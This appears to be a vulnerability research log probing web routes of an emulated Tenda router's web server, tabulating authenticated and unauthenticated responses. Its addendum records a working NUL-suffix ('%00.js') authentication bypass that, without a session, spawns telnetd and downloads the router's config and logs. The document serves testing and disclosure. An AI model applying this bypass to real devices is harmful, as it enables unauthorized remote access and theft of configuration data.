# Native Web Route Probe Results

Date: 2026-04-21 local / 2026-04-22 UTC logs

Target:

- Public proxy: `http://127.0.0.1:18080`
- Native container: `tenda-b104-native-httpd`
- Authenticated test password: `Tenda_888888`

Methodology:

- Authenticated probes used one successful JSON login:
  `POST /login/Auth` with `Content-Type: application/json; charset=UTF-8`.
- Redirects were not followed.
- Upload and upgrade routes were probed with safe `GET` requests only. No
  firmware, router config, APN list, OpenVPN config, CA, or WireGuard config
  was uploaded.
- Hidden service routes were checked for process/listener side effects, then
  spawned test services were killed.
- A later auth deep dive found that appending `%00.js` or another whitelisted
  static suffix bypasses the auth gate for protected routes. Plain route
  results below are still valid, but see `AUTH_DEEP_DIVE.md` for bypass probes.

## Results

| Route | Probe | No auth result | Auth result | Side effects / notes |
| --- | --- | --- | --- | --- |
| `/login/Auth` | `POST` JSON valid credentials | `200 {"errCode":0}`, sets `password=` cookie and redirects to `/` | `200 {"errCode":0}` | Login expects JSON. Earlier form-encoded curls caused lockout increments. |
| `/logout/Auth` | `GET` | `302 /login.html` | `302 /login.html` | Authenticated request logs the session out. |
| `/login/Usernum` | `GET` | `200 {"errCode":0}` | `404 Cannot open URL` | Appears intended for the login page before an authenticated session is active. |
| `/goform/getModules?modules=systemStatus` | `GET` | `200 {"errCode":1000}` | `200 {"systemStatus":{}}` | No-auth request is not redirected, but returns the UI auth-expired code. |
| `/goform/setModules` | `POST {"updateLoginoption":"click"}` | `200 {"errCode":""}` | `200 {"errCode":""}` | This benign `updateLoginoption` action appears accepted without auth; this does not prove arbitrary module writes are unauthenticated. |
| `/goform/WifiApScan` | `GET` | `200 {"errCode":999}` | `200` HTML error: `Form WifiApScan is not defined` | Route exists, but this minimal request did not invoke a scan in the emulation. |
| `/goform/telnet` | `GET` | `302 /login.html` | Proxy `502` from upstream `BadStatusLine('load telnetd success.')` | Authenticated request spawned `/usr/sbin/telnetd` and opened `:::23/tcp`. |
| `/goform/ate` | `GET` | `302 /login.html` | Proxy `502` from upstream `BadStatusLine('load mfg success.')` | Authenticated request spawned `/usr/sbin/td_ate`; no new TCP listener observed. |
| `/goform/zerotier` | `GET` | `302 /login.html` | Proxy `502` from upstream `BadStatusLine('invalid zerotier link.')` | No `td_zerotier` process was observed with no query parameters. |
| `/cgi-bin/upgrade` | `GET` | `400 Bad HTTP request` | `400 Bad HTTP request` | GET is rejected before normal auth behavior is visible. No upload tested. |
| `/cgi-bin/UploadCfg` | `GET` | `302 /login.html` | `200 {"errCode":3}` | No config upload tested. |
| `/cgi-bin/DownloadCfg` | `GET` | `302 /login.html` | `200`, binary config backup, 16720 bytes | Authenticated users can download router config. Treat output as sensitive. |
| `/cgi-bin/DownloadLog` | `GET` | `302 /login.html` | `200`, tar/syslog archive, 306688 bytes | Authenticated users can download logs. |
| `/cgi-bin/DownloadSyslog` | `GET` | `302 /login.html` | `302 /error.htm` | Likely requires generated syslog state not present in this emulation. |
| `/cgi-bin/exportCapture` | `GET` | `302 /login.html` | `302 /error.htm` | Likely requires an active capture file/state. |
| `/cgi-bin/uploadApnList` | `GET` | `302 /login.html` | `200 {"errCode":1}` | No APN file upload tested. |
| `/cgi-bin/Uploadclient_ovpn` | `GET` | `302 /login.html` | `200 {"errCode":1}` | No OpenVPN client file upload tested. |
| `/cgi-bin/Uploadca_file` | `GET` | `302 /login.html` | `200 {"errCode":1}` | No CA file upload tested. |
| `/cgi-bin/UploadWireGuardClientCfg` | `GET` | `302 /login.html` | `200 {"UploadWireGuardClientCfg":{"result":-1}}` | No WireGuard file upload tested. |

## NUL Suffix Auth Bypass Addendum

Confirmed unauthenticated bypass probes:

| Route | Probe | No-auth result | Side effects / notes |
| --- | --- | --- | --- |
| `/goform/telnet%00.js` | `GET` | Proxy `502` from native bare response | Spawned `telnetd`, opened TCP/23. |
| `/goform/ate%00.js` | `GET` | Proxy `502` from native bare response | Spawned `td_ate`, opened UDP/7329. |
| `/cgi-bin/DownloadCfg%00.js` | `GET` | `200`, 16720 bytes, `config/conf` | Downloaded protected config backup without a session. |
| `/cgi-bin/DownloadLog%00.js` | `GET` | `200`, 308224 bytes, `config/conf` | Downloaded protected log archive without a session. |
| `/goform/setModules%00.js` | `POST {"noSuchModule":"x"}` | `200 {"errCode":""}` | Reached broad write route; invalid module body was used to avoid state change. |

Negative controls:

- `/goform/telnet%00` without a whitelisted suffix redirected to login.
- `/goform/telnet%2ejs` redirected to login.
- `/goform/ate.js` returned `Form ate.js is not defined` and did not spawn
  `td_ate`.
- `/public/../goform/telnet` and `/lang/../goform/ate` returned
  `400 Bad HTTP request` and did not spawn handlers.

## Cleanup State

After probing, spawned hidden-route processes were killed. Final listener state:

```text
tcp 0.0.0.0:80  LISTEN /usr/sbin/httpd
tcp 0.0.0.0:443 LISTEN /usr/sbin/httpd
```

No `telnetd`, `td_ate`, `td_zerotier`, or `zerotier-one` process remained.
